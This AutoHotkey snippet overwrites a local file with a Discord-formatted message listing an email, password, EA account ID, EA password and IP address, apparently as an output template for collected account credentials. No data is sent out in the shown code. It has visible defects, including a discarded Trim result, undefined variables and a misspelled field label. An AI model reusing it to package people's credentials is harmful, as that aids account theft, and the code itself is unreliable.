filePath := "./data/discord.txt"

AppendDiscordText(text, filePath) {
  if FileExist(filePath) {
    FileDelete, % filePath
  }

  FileAppend, % text, % filePath
}

emailAddress := "test`n"
emailAddress := StrReplace(emailAddress, "`n", "")
Trim(emailAddress, OmitChars = " `t")
DiscordMessage := "# >Account [ " counter " ]\n``````css\nEmail:" emailaddress "\nPasword: " emailpassword "\nEA: " eaid "\nEA-Password: " eapass "\n``````\n**IpAddress:** ||" ipaddress "||"

AppendDiscordText(DiscordMessage, filePath)